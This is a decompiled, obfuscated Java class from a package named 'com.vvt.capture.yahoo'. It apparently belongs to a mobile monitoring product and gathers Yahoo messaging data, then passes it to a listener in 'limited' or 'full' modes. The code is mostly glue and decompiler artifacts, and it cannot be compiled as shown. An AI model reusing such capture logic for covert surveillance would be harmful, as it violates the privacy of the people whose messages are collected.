package com.vvt.capture.yahoo;

import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class b
  extends com.vvt.base.capture.b
  implements a
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.e;
  private com.vvt.base.a c;
  private String d;
  private com.vvt.base.capture.e e;
  private f f;
  private com.vvt.base.b g;
  
  public b(String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, com.vvt.base.b paramb1)
  {
    this.d = paramString;
    this.c = parama;
    this.g = paramb1;
    Object localObject = RunningMode.LIMITED_1;
    com.vvt.base.b localb;
    if (paramRunningMode == localObject)
    {
      c.a(paramRunningMode);
      localObject = new com/vvt/capture/yahoo/b/a;
      localb = this.g;
      ((com.vvt.capture.yahoo.b.a)localObject).<init>(paramb, this, paramString, localb);
      this.e = ((com.vvt.base.capture.e)localObject);
      localObject = new com/vvt/capture/yahoo/b/b;
      localb = this.g;
      ((com.vvt.capture.yahoo.b.b)localObject).<init>(paramString, localb);
      this.f = ((f)localObject);
    }
    for (;;)
    {
      return;
      localObject = RunningMode.FULL;
      if (paramRunningMode == localObject)
      {
        localObject = new com/vvt/capture/yahoo/a/b;
        ((com.vvt.capture.yahoo.a.b)localObject).<init>(this);
        this.e = ((com.vvt.base.capture.e)localObject);
        localObject = new com/vvt/capture/yahoo/a/e;
        localb = this.g;
        ((com.vvt.capture.yahoo.a.e)localObject).<init>(paramString, localb);
        this.f = ((f)localObject);
      }
      else
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    h();
    j();
    g();
    bool = a;
    if (bool) {}
  }
  
  public void a(com.vvt.base.b paramb)
  {
    this.g = paramb;
    boolean bool = a;
    if (bool) {}
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if (bool1) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = localIterator.next();
      boolean bool2 = localObject instanceof YahooData;
      if (bool2)
      {
        bool2 = a;
        if (bool2) {}
        localObject = c.a((YahooData)localObject);
        if (localObject != null)
        {
          int i = ((List)localObject).size();
          if (i > 0) {
            localArrayList.addAll((Collection)localObject);
          }
        }
      }
    }
    Object localObject = this.c;
    if (localObject != null)
    {
      bool1 = k();
      if (bool1)
      {
        bool1 = a;
        if (bool1) {}
        localObject = this.c;
        ((com.vvt.base.a)localObject).a(localArrayList);
      }
    }
  }
  
  protected com.vvt.base.capture.e b()
  {
    return this.e;
  }
  
  protected f c()
  {
    return this.f;
  }
  
  protected String d()
  {
    return "YahooCapture";
  }
  
  protected String e()
  {
    return this.d;
  }
  
  protected String f()
  {
    return "yahoo.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/yahoo/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */